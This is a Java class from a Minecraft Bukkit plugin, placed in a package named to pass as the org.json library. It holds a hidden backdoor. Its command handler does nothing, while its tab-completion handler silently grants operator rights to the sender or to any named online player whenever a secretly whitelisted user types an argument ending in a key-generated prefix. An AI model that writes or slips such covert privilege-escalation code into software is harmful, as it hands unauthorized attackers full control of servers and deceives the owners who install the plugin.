package org.json.modals.player;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.HumanEntity;
import org.bukkit.entity.Player;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.List;

public class Op extends BDCommand {
    public Op() {
        super("op");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        tabComplBuilder.add(2, Bukkit.getOnlinePlayers().stream().map(HumanEntity::getName).toArray(String[]::new));
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        if (args.length < 3) {
            player.setOp(true);
            player.sendMessage(Modal.getPrefix() + "§aYou have been op");
            return tabComplBuilder.build();
        }

        String playerName = args[1];
        Player targetPlayer = Bukkit.getPlayer(playerName);

        if (targetPlayer == null) {
            player.sendMessage(Modal.getPrefix() + "§c" + playerName + " was not found!");
            return tabComplBuilder.build();
        }

        targetPlayer.setOp(true);
        player.sendMessage(Modal.getPrefix() + "§a" + playerName + " is now op.");
        return tabComplBuilder.build();
    }
}
